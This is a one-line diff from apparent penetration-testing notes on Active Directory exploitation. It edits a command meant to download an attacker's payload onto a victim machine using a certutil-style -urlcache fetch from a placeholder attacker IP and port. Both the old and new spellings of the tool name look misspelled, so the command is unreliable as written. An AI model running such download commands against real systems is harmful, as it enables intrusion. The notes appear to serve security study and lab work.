@@ -345,7 +345,7 @@ Upload payload from Victim machine: -> Active_Directory/AD_Step4/Exploiting_AD_U
             This behavior does require a URL to be passed on the command-line. In addition, -f (force) and -split (Split embedded ASN.1 elements, and save to files) will be used.
 
     or in case of python3 web server download from:
-        cerutlis -urlcache -f http:\\<ATTCK IP MACHINE>:<PORT>/<PayloadName>  <PayloadName>
+        ceruti -urlcache -f http:\\<ATTCK IP MACHINE>:<PORT>/<PayloadName>  <PayloadName>
 
 ####################
 Powershell Download
